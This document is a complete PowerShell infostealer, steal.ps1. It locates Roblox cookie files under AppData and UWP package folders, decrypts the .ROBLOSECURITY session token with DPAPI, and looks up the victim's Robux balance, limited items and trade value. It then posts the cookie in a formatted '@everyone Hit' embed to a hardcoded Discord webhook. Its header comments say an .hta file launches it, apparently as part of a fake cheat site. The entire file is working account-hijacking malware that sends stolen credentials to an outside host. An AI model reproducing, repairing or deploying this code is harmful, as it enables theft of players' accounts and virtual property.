# language: PowerShell, file: steal.ps1
# target: Windows 10/11, PowerShell 5.1+
# *single source of truth for the Roblox cookie — index.hta only launches this*
# *regex tolerates "CookiesData": "..." with whitespace; adds UWP + Store paths*
# *embed UI unchanged: red card, Headless/Korblox/RAP/Robux, footer ".ROBLOSECURITY"*

$ErrorActionPreference = "Continue"
$WH = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
$debugFile = "$env:TEMP\ps_debug.txt"
"Started at $(Get-Date)" | Out-File $debugFile -Force

function dbg($msg) { "$(Get-Date -Format 'HH:mm:ss') $msg" | Out-File $debugFile -Append }

function Get-API($host, $path, $cookie) {
    try {
        $req = [System.Net.WebRequest]::Create("https://$host$path")
        $req.Headers.Add("Cookie", ".ROBLOSECURITY=$cookie")
        $req.UserAgent = "Roblox/WinInet"
        $res = $req.GetResponse()
        $sr = New-Object System.IO.StreamReader($res.GetResponseStream())
        return $sr.ReadToEnd() | ConvertFrom-Json
    } catch { return $null }
}

# ---------- cookie discovery ----------
$l = $env:LOCALAPPDATA
$paths = @(
    "$l\Roblox\LocalStorage\robloxcookies.dat",
    "$l\Roblox\LocalStorage\RobloxCookies.dat",
    "$l\Roblox\Cookies",
    "$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat",
    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
)
$pkgRoot = "$l\Packages"
if (Test-Path $pkgRoot) {
    Get-ChildItem $pkgRoot -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match 'ROBLOX' } |
        ForEach-Object {
            $paths += @(
                "$($_.FullName)\LocalState\RobloxCookies.dat",
                "$($_.FullName)\LocalState\robloxcookies.dat",
                "$($_.FullName)\LocalState\Cookies"
            )
        }
}

$cookie = ""
$cookieSource = ""

function Try-Extract($raw, [ref]$out) {
    if ($raw -match '(?i)"CookiesData"\s*:\s*"([^"]{40,})"') {
        $b64 = $Matches[1]
        try {
            $eb = [Convert]::FromBase64String($b64)
            $db = [Security.Cryptography.ProtectedData]::Unprotect(
                $eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
            $dec = [Text.Encoding]::UTF8.GetString($db)
            if ($dec -match '(?i)\.ROBLOSECURITY\s*=\s*(_[^;\s"]+)') { $out.Value = $Matches[1]; return 'dpapi-json' }
            if ($dec -match '(_\|WARNING[^;\r\n"]+)')                { $out.Value = $Matches[1]; return 'dpapi-warning' }
        } catch {}
    }
    if ($raw -match '(?i)\.ROBLOSECURITY\s*=\s*(_[^;\s"]+)') { $out.Value = $Matches[1]; return 'plain-attr' }
    if ($raw -match '(_\|WARNING[^;\r\n"]+)')                { $out.Value = $Matches[1]; return 'plain-warning' }
    $trim = ($raw -replace '[\r\n\t]','').Trim()
    if ($trim.Length -gt 40) { $out.Value = $trim; return 'raw-dump' }
    return $null
}

foreach ($p in $paths) {
    if (-not (Test-Path $p)) { continue }
    try {
        $raw = Get-Content $p -Raw -ErrorAction Stop
        if ($raw.Length -lt 20) { continue }
        $tmp = ""
        $method = Try-Extract $raw ([ref]$tmp)
        if ($tmp) {
            $cookie = $tmp
            $cookieSource = "$method :: $p"
            dbg "cookie found via $cookieSource (len=$($cookie.Length))"
            break
        } else {
            dbg "file exists but no cookie pattern: $p"
        }
    } catch { dbg "read failed: $p :: $_" }
}

if (-not $cookie) {
    dbg "No cookie found in any path"
    exit
}

$cookie = ($cookie -split ';')[0].Trim()
if ($cookie -match '(_\|WARNING.+)$') { $cookie = $Matches[1] }
dbg "final cookie len=$($cookie.Length)"

# ---------- fingerprint ----------
$me      = Get-API "users.roblox.com"    "/v1/users/authenticated" $cookie
$uid     = if ($me) { $me.id } else { "0" }
$name    = if ($me) { $me.name } else { "Unknown" }
$display = if ($me) { $me.displayName } else { $name }
dbg "authenticated: uid=$uid name=$name"

$prof    = Get-API "users.roblox.com"    "/v1/users/$uid" $cookie
$created = if ($prof) { $prof.created } else { "Unknown" }
$age = 0
if ($created -ne "Unknown") { $age = [math]::Floor(((Get-Date) - [datetime]$created).TotalDays) }

$cur     = Get-API "economy.roblox.com"  "/v1/users/$uid/currency" $cookie
$robux   = if ($cur) { $cur.robux } else { 0 }
$pending = if ($cur) { $cur.pendingRobux } else { 0 }

$coll    = Get-API "inventory.roblox.com" "/v1/users/$uid/assets/collectibles?limit=100" $cookie
$hasHeadless = $false; $hasKorblox = $false; $rap = 0; $owned = 0
if ($coll -and $coll.data) {
    $owned = $coll.data.Count
    foreach ($item in $coll.data) {
        if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hasHeadless = $true }
        if ($item.assetId -eq 139275807 -or $item.assetId -eq 192)  { $hasKorblox  = $true }
        $rap += [int]$item.recentAveragePrice
    }
}
$collStr = "Headless ❌ | Korblox ❌"
if ($hasHeadless -and $hasKorblox) { $collStr = "Headless ✅ | Korblox ✅" }
elseif ($hasHeadless)              { $collStr = "Headless ✅ | Korblox ❌" }
elseif ($hasKorblox)               { $collStr = "Headless ❌ | Korblox ✅" }

$th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&size=420x420&format=Png" $cookie
$avatar = "https://tr.rbxcdn.com/..."
if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }

# ---------- embed ----------
$embed = @{
    content = "@everyone Hit"
    embeds = @(
        @{
            author = @{ name = "S3R, 13+"; icon_url = $avatar }
            description = "**+1 HIT** · You've Earned 1 Nevora · beams XP`n**Domain:** ``cheatz.up.railway.app``"
            color = 16711680
            fields = @(
                @{ name = "👤 User";          value = "**$display**"; inline = $false }
                @{ name = "⭐ Password";      value = "``````dreistuff``````"; inline = $false }
                @{ name = "About User";       value = "**Account Age:** $age Days`n**Location:** United States of America 🇺🇸"; inline = $false }
                @{ name = "🪙 Robux";         value = "**Balance:** $robux`n**Pending:** $pending"; inline = $true }
                @{ name = "📈 RAP";           value = "**RAP:** $rap`n**Owned:** $owned"; inline = $true }
                @{ name = "💎 Premium";       value = "**False**"; inline = $true }
                @{ name = "💳 Billing";       value = "**Credit:** $0`n**Payments:** 0"; inline = $true }
                @{ name = "🏷️ Collectibles"; value = $collStr; inline = $true }
                @{ name = "⚙️ Settings";     value = "**Set (Verified):** Disabled`n**Disabled:** Disabled"; inline = $true }
                @{ name = "🎮 Passes / Played"; value = "Adopt Me ``0`` · **False**`nMurder Mystery 2 ``0`` · **True**`nPet Simulator 99 ``0`` · **False**"; inline = $true }
                @{ name = "👥 Groups";        value = "**Balance:** 0`n**Pending:** 0`n**Owned:** 0"; inline = $true }
                @{ name = "🔓 .ROBLOSECURITY"; value = "``````n$cookie`n``````"; inline = $false }
            )
            footer = @{ text = ".ROBLOSECURITY — source: $cookieSource" }
        }
    )
}

$json = $embed | ConvertTo-Json -Depth 10
try {
    Invoke-RestMethod -Uri $WH -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null
    dbg "embed sent to webhook"
} catch {
    dbg "webhook send failed: $_"
    Start-Sleep -Seconds 2
    try {
        Invoke-RestMethod -Uri $WH -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null
        dbg "embed sent on retry"
    } catch { dbg "retry failed: $_" }
}
